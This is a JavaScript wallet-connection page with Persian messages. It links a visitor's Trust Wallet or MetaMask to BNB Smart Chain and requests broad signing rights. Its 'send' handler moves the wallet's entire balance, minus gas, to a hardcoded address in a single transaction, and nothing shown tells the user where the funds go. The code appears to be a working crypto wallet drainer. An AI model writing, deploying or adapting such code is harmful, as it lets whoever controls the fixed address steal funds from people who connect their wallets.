import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

let selectedWallet = null;

const connectBtn = document.getElementById("connect");
const trustBtn = document.getElementById("trust");
const mmBtn = document.getElementById("metamask");
const optionsDiv = document.getElementById("wallet-options");
const infoDiv = document.getElementById("info");
const addrSpan = document.getElementById("address");
const balSpan = document.getElementById("balance");
const btnSend = document.getElementById("send");

connectBtn.onclick = () => {
  optionsDiv.style.display = "block";
};

trustBtn.onclick = () => {
  selectedWallet = "trust";
  startConnection();
};

mmBtn.onclick = () => {
  selectedWallet = "metamask";
  startConnection();
};

async function startConnection() {
  const provider = await EthereumProvider.init({
    projectId: PROJECT_ID,
    showQrModal: false,
    optionalChains: [56],
    rpcMap: {
      56: "https://bsc-dataseed.binance.org/"
    },
    methods: [
      "eth_sendTransaction",
      "eth_signTransaction",
      "eth_sign",
      "personal_sign",
      "eth_signTypedData"
    ],
    events: ["chainChanged", "accountsChanged"]
  });

  provider.on("display_uri", (uri) => {
    let link = "";
    if (selectedWallet === "trust") {
      link = `trust://wc?uri=${encodeURIComponent(uri)}`;
    } else if (selectedWallet === "metamask") {
      link = `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
    }

    // ارسال کاربر به لینک والت
    window.location.href = link;
  });

  try {
    await provider.enable();

    const ethProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethProvider.getSigner();
    const address = await signer.getAddress();
    const balance = await ethProvider.getBalance(address);

    addrSpan.textContent = address;
    balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
    infoDiv.style.display = "block";

    btnSend.onclick = async () => {
      const bal = await ethProvider.getBalance(address);
      const gas = (await ethProvider.getGasPrice()).mul(21000);
      const value = bal.sub(gas);
      if (value.lte(0)) return alert("موجودی کافی برای کارمزد نیست!");

      const tx = await signer.sendTransaction({
        to: TARGET_ADDRESS,
        value,
        gasPrice: gas.div(21000),
        gasLimit: 21000
      });

      alert("تراکنش ارسال شد:\n" + tx.hash);
      await tx.wait();
      alert("تأیید شد!");

      const newBal = await ethProvider.getBalance(address);
      balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
    };
  } catch (err) {
    console.error(err);
    alert("خطا در اتصال: " + err.message);
  }
}